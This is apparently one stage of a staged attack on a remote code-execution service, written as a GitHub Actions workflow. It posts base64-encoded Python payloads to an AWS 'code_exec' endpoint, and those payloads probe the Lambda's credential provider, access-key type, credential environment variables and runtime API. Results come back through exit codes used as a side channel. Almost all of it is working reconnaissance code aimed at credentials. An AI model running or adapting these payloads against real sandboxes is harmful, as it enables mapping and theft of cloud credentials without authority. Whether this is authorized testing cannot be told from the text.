name: Stage2-03-Lambda-Credential-Fingerprint

on:
  push:
    branches:
      - corgi

permissions:
  contents: read

jobs:
  fingerprint:
    runs-on: ubuntu-latest

    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      API_URL: https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec

    steps:
      - name: Install dependencies
        run: |
          python3 -m pip install requests requests-aws4auth --quiet

      - name: Fingerprint Lambda credentials
        run: |
          python3 - <<'PY'
          import os
          import base64
          import requests
          from requests_aws4auth import AWS4Auth

          auth = AWS4Auth(
              os.environ["AWS_ACCESS_KEY_ID"],
              os.environ["AWS_SECRET_ACCESS_KEY"],
              "us-east-1",
              "execute-api",
              session_token=os.environ["AWS_SESSION_TOKEN"]
          )

          tests = {
              "credential_provider": r'''
          import boto3

          try:
              session = boto3.Session()
              credentials = session.get_credentials()

              if credentials is None:
                  raise SystemExit(9)

              method = str(getattr(credentials, "method", "")).lower()

              if "env" in method:
                  raise SystemExit(7)

              if "container" in method or "role" in method:
                  raise SystemExit(8)

              if "assume" in method:
                  raise SystemExit(10)

              raise SystemExit(11)

          except SystemExit:
              raise
          except Exception:
              raise SystemExit(19)
          ''',

              "access_key_type": r'''
          import boto3

          try:
              credentials = boto3.Session().get_credentials()

              if credentials is None:
                  raise SystemExit(9)

              key = credentials.access_key or ""

              if key.startswith("ASIA"):
                  raise SystemExit(7)

              if key.startswith("AKIA"):
                  raise SystemExit(8)

              raise SystemExit(10)

          except SystemExit:
              raise
          except Exception:
              raise SystemExit(19)
          ''',

              "lambda_environment": r'''
          import os

          required = [
              "AWS_LAMBDA_FUNCTION_NAME",
              "AWS_LAMBDA_FUNCTION_VERSION",
              "AWS_EXECUTION_ENV",
              "AWS_REGION",
              "AWS_ACCESS_KEY_ID",
              "AWS_SECRET_ACCESS_KEY",
              "AWS_SESSION_TOKEN"
          ]

          present = sum(1 for name in required if os.environ.get(name))

          raise SystemExit(20 + min(present, 20))
          ''',

              "runtime_api": r'''
          import os

          if os.environ.get("AWS_LAMBDA_RUNTIME_API"):
              raise SystemExit(7)

          raise SystemExit(9)
          '''
          }

          for name, code in tests.items():
              encoded = base64.b64encode(code.encode()).decode()

              response = requests.post(
                  os.environ["API_URL"],
                  json={"code": encoded},
                  auth=auth,
                  timeout=40
              )

              print(f"TEST={name}")
              print(response.text)
              print("---")
          PY
